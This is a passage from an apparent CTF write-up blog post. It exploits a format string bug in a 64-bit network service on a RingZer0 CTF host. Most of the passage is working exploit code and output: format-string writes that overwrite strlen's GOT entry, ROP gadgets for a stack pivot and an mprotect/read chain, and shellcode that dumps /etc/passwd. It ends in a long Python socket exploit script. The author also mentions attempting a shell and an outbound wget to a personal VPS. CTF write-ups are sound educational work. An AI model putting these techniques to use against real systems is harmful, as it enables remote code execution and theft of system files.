</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;</span><span class="si">%66c</span><span class="s">%{}$hhn</span><span class="si">%255c</span><span class="s">%{}$hhn</span><span class="si">%18c</span><span class="s">%{}$hhn</span><span class="se">\n</span><span class="s">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">format_offset</span><span class="o">+</span><span class="mi">636</span><span class="p">,</span> <span class="n">format_offset</span><span class="o">+</span><span class="mi">637</span><span class="p">,</span> <span class="n">format_offset</span><span class="o">+</span><span class="mi">638</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="c"># read it back to check!</span>
</span><span class='line'><span class="n">check</span> <span class="o">=</span> <span class="n">read_from_address</span><span class="p">(</span><span class="mh">0x601e20</span><span class="p">,</span> <span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">check</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>First, it writes out <code>0x601e20</code>, <code>0x601e21</code> and <code>0x601e22</code> on the stack. <code>0x601e20</code> is an unused memory address close the GOT entries. Then, the payload to actually write three bytes to those addresses looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="s">&quot;</span><span class="si">%66c</span><span class="s">%{}$hhn</span><span class="si">%255c</span><span class="s">%{}$hhn</span><span class="si">%18c</span><span class="s">%{}$hhn</span><span class="se">\n</span><span class="s">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">format_offset</span><span class="o">+</span><span class="mi">636</span><span class="p">,</span> <span class="n">format_offset</span><span class="o">+</span><span class="mi">637</span><span class="p">,</span> <span class="n">format_offset</span><span class="o">+</span><span class="mi">638</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>What it does, is print 66 dummy bytes (0x42 == &lsquo;B&rsquo;) and then writes out the number of bytes written so far (<code>%hhn</code>) to a location that is pointed to by parameter 636. Then, it prints 255 dummy bytes, to make the write counter overflow. Writing out the next byte with <code>%hhn</code> will output 66+255 % 256 = 61, &lsquo;A&rsquo;). The next byte is written in the same way. This allows three bytes to be written at once, and will allow overwriting the GOT entry of strlen with the address of system!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>python sploit7.py
</span><span class='line'>parameter <span class="m">5</span> points to:  0x7fff3ca480d8
</span><span class='line'>address pointed to by parameter <span class="m">5</span> contains:  0x7fff3ca49f01
</span><span class='line'>scratch contains:  0x601b
</span><span class='line'>scratch is parameter 1601
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> strlen is at 0x7f82b7326c40.
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> libc_base is at 0x7f82b72a60d0.
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> wrote 0x601e20 to 1601
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> wrote 0x601e21 to 1602
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> wrote 0x601e22 to 1603
</span><span class='line'>
</span><span class='line'>0x534142
</span></code></pre></td></tr></table></div></figure>


<p>OK, so that worked! I plugged in the values for system, the GOT entry for strlen and crossed my fingers. I tried to spawn a shell, but alas, no output. The binary had crashed though, and I tried again, this time trying for outbound access to my vps with <code>wget</code>. However, I never saw a HTTP connection and the remote binary seemed to hang. The service did not come back up. Uh-oh.</p>

<h2>Reaching out</h2>

<p>I apologized to <a href="https://twitter.com/MrUn1k0d3r">Mr.Un1k0d3r</a> via Twitter and he seemed interested in my poc. He even offered me to send the binary so I could play with it locally; I jumped at this chance of course, and requested the libc as well. Furthermore, he informed me that the box was heavily firewalled for security reasons (it being part of a CTF and all) and that my shell would not be accessible at all&hellip;</p>

<p>&hellip;Challenge accepted! :)</p>

<p>So it&rsquo;s back to the drawing board. The <code>system()</code> trick would not work, as the binary was not being ran using <code>socat</code>. It handled all the connections itself. Spawning a shell would not connect stdin, stdout and stderr to the socket that the binary was using, effectively stopping me from interacting with the shell.</p>

<p>Instead, I figured I could achieve an interactive shell by first using a call to <code>dup2</code> to duplicate the socket file descriptor, to couple it to stdin and stdout. This was inspired by <a href="http://shell-storm.org/shellcode/files/shellcode-881.php">this shellcode</a>.</p>

<p>First things first, though, I needed a ROP chain to actually read in the shellcode and run it. The stack was not executable (NX took care of that), so I had find a way to call <code>mprotect</code> to mark a section <code>rwx</code> and then <code>read</code> in the shellcode.</p>

<p>I started working on the ROP chain before Mr. Un1k0d3r sent over the files. This was pretty hard, as I had to search for the gadgets in libc (the binary did not contain enough gadgets) by dumping it. I first uploaded my own libc to <a href="http://ropshell.com">ropshell</a>. Once I had found a gadget, I dumped from -0x100 to +0x100 relative to that address; this allowed me to find the gadgets I needed. Luckily, soon after, I obtained the libc and the binary from Mr.Un1k0d3r, which helped a lot. I ran it in a 64-bit Kali (based on Debian) and started building and debugging my ROP exploit. But hold on a second!</p>

<h2>Pivot the Stack</h2>

<p>This wasn&rsquo;t a buffer overflow where I had full control over the stack! The ROP chain was somewhere in <code>buf</code> and I needed to make <code>rsp</code> point to it. Only then, the ROP chain would kick off properly. I had to find a single gadget that did this in one go. I roughly knew the location of <code>buf</code> relative to <code>rsp</code> (approximately at <code>rsp+0xd8</code>, which I reverse-engineered from the disassembly of the dumped binary). Why <code>buf</code>? <code>buf</code> <strong>can</strong> contain null bytes, whereas <code>cleanBuffer</code> cannot:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">strncpy</span><span class="p">(</span><span class="n">cleanBuffer</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>The strncpy takes care of that; any null byte it encounters will make it stop copying. Because we&rsquo;re on 64-bit, the gadget addresses will for sure contain null bytes. Instead, have a look at where <code>strlen</code> is used:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">cleanBuffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span><span class='line'><span class="c1">// dissambled:</span>
</span><span class='line'><span class="n">lea</span> <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x11f0</span><span class="p">]</span>
</span><span class='line'><span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rax</span>      <span class="c1">// rax and rdi now point to buf</span>
</span><span class='line'><span class="n">call</span> <span class="n">dword</span> <span class="mh">0x400b00</span> <span class="c1">// strlen</span>
</span></code></pre></td></tr></table></div></figure>


<p>This meant that I had multiple options to pivot <code>rsp</code> to <code>buf</code>, for instance with a <code>xchg rax, rsp</code> gadget. Upon finding no suitables ones, I had to go with stack lifting. I uploaded the libc which I got from Mr. Un1k0d3r to ropshell.com and starting looking for gadgets. What would I need?</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">stack</span> <span class="n">lifting</span>
</span><span class='line'><span class="n">syscall</span>
</span><span class='line'><span class="n">pop</span> <span class="n">rax</span>
</span><span class='line'><span class="n">pop</span> <span class="n">rdi</span>
</span><span class='line'><span class="n">pop</span> <span class="n">rsi</span>
</span><span class='line'><span class="n">pop</span> <span class="n">rdx</span>
</span></code></pre></td></tr></table></div></figure>


<p>See, I needed quite a few gadgets to be able to call <code>mprotect</code> and <code>read</code>. First, the stack lifting: I settled on <code>0x00082cfe: add rsp, 0x100; ret</code> in libc. I had no idea if I would have the correct amount added to <code>rsp</code>, but I solved that the lazy way by adding the ROP equivalent of a NOP-sled:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="mh">0x041cf9</span><span class="o">:</span> <span class="n">ret</span>
</span></code></pre></td></tr></table></div></figure>


<p>This will keeping returning until the ROP chain hits the next correct gadget! I put everything together and tested it locally&hellip; but no dice! I debugged it in <code>gdb-peda</code> and the <code>mprotect</code> syscall seemed to work. The shellcode, however, was not being read in properly. The socket file descriptor was the problem. It was not a predictable value, so I could not hardcode it. I found that the socket was stored on the stack, but I could not leak it via the format string vulnerability. It was located at <code>rbp-0x48</code>, so I had to adjust my ROP chain to grab this value and use it in the <code>read</code> syscall. I had to build another ROP chain to get at it&hellip;</p>

<h2>Grabbing the socket descriptor value</h2>

<p>I started looking for gadgets that allowed me to dereference <code>rbp</code>. I ended up with these ones:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="mh">0x0002028a</span> <span class="o">:</span> <span class="n">pop</span> <span class="n">r15</span><span class="p">;</span> <span class="n">ret</span>
</span><span class='line'><span class="mh">0x0006933f</span> <span class="o">:</span> <span class="n">lea</span> <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">rbp</span> <span class="o">+</span> <span class="n">r15</span><span class="p">];</span> <span class="n">pop</span> <span class="n">rbp</span><span class="p">;</span> <span class="n">pop</span> <span class="n">r12</span><span class="p">;</span> <span class="n">pop</span> <span class="n">r13</span><span class="p">;</span> <span class="n">pop</span> <span class="n">r14</span><span class="p">;</span> <span class="n">pop</span> <span class="n">r15</span><span class="p">;</span> <span class="n">ret</span>
</span><span class='line'><span class="mh">0x000eb938</span> <span class="o">:</span> <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">rax</span><span class="p">];</span> <span class="n">ret</span>
</span><span class='line'><span class="mh">0x0002c10e</span> <span class="o">:</span> <span class="n">xchg</span> <span class="n">eax</span><span class="p">,</span> <span class="n">edi</span><span class="p">;</span> <span class="n">ret</span>
</span></code></pre></td></tr></table></div></figure>


<p>The process is simple. The first <code>pop r15</code> will pop <code>-0x48</code> from the stack. Then, the address <code>rbp+r15</code> (effectively pointing to <code>rbp-0x48</code>) is loaded into <code>rax</code>. The value at this address is taken into <code>rax</code> in the third gadget. Finally, the value is stored in <code>edi</code>, ready for use in the <code>read</code> syscall. Here, I assume that the socket descriptor is less than 32 bits, which I think is reasonable. The <code>read</code> part of the ROP chain will read in the shellcode that we send and return to it.</p>

<p>I started with a modified read /etc/passwd shellcode, the <a href="http://shell-storm.org/shellcode/files/shellcode-878.php">original</a> of which was made by Mr.Un1k0d3r :)</p>

<h2>Putting it all together</h2>

<p>So from a high level, I use the format string vulnerability to write out the addresses of the first three bytes of the GOT entry of <code>strlen</code> to the stack. Then, using those addresses, the first three bytes of strlen&rsquo;s GOT entry are overwritten. The GOT entry of strlen then points to the stack lifting gadget. Upon connecting again, I send the ROP chain, the stack lifting gadget will be called instead of strlen, setting <code>rsp</code> to <code>buf</code>. The ROP chain kicks off and will grab the socket descriptor value, call <code>mprotect</code> and <code>read</code> in a shellcode. The shellcode will also use the socket descriptor and write the contents of <code>/etc/passwd</code> to the socket. All I have to do now is to sit back :)</p>

<p>Without further ado:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">time</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;L&#39;</span><span class="p">,</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffffff</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="k">def</span> <span class="nf">grab_value_directly</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;$lx</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>  <span class="n">addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">addr</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">grab_value_indirectly</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;$s</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>  <span class="n">addr</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># ugly workaround, only grab 8 bytes. will fix this later!</span>
</span><span class='line'>  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">8</span><span class="p">:</span>
</span><span class='line'>      <span class="n">address</span> <span class="o">=</span> <span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">8</span><span class="p">]</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="n">address</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">8</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;L&#39;</span><span class="p">,</span> <span class="n">address</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">write_byte_value_via</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;c%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;$hhn</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">read_from_address</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">offset</span><span class="p">):</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
</span><span class='line'>      <span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span>
</span><span class='line'>      <span class="n">addr</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">b</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>          <span class="n">b</span> <span class="o">=</span> <span class="mi">256</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>          <span class="n">i</span> <span class="o">=</span> <span class="mi">256</span>
</span><span class='line'>      <span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>       <span class="c"># change address</span>
</span><span class='line'>      <span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">636</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>     <span class="c"># write byte</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">dump1</span> <span class="o">=</span> <span class="n">grab_value_indirectly</span><span class="p">(</span><span class="mi">636</span><span class="o">+</span><span class="n">offset</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">dump1</span>
</span><span class='line'>
</span><span class='line'><span class="c"># write a value to a string format parameter</span>
</span><span class='line'><span class="k">def</span> <span class="nf">write_on_stack</span><span class="p">(</span><span class="n">what</span><span class="p">,</span> <span class="n">where</span><span class="p">,</span> <span class="n">offset</span><span class="p">):</span>
</span><span class='line'>  <span class="c"># write out all the bytes of what</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
</span><span class='line'>      <span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="n">what</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span>
</span><span class='line'>      <span class="n">what</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">b</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>          <span class="n">b</span> <span class="o">=</span> <span class="mi">256</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="n">where</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>          <span class="n">i</span> <span class="o">=</span> <span class="mi">256</span>
</span><span class='line'>      <span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">i</span><span class="o">+</span><span class="n">where</span><span class="p">)</span>
</span><span class='line'>      <span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">636</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] wrote {} to {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">grab_value_directly</span><span class="p">(</span><span class="mi">636</span><span class="o">+</span><span class="n">offset</span><span class="o">+</span><span class="n">where</span><span class="o">/</span><span class="mi">8</span><span class="p">)),</span> <span class="mi">636</span><span class="o">+</span><span class="n">offset</span><span class="o">+</span><span class="n">where</span><span class="o">/</span><span class="mi">8</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="n">parameter_636_addr</span> <span class="o">=</span> <span class="n">grab_value_directly</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;parameter 5 points to: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">parameter_636_addr</span><span class="p">)</span>
</span><span class='line'><span class="n">value_at_636</span> <span class="o">=</span> <span class="n">grab_value_indirectly</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;address pointed to by parameter 5 contains: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">value_at_636</span><span class="p">)</span>
</span><span class='line'>
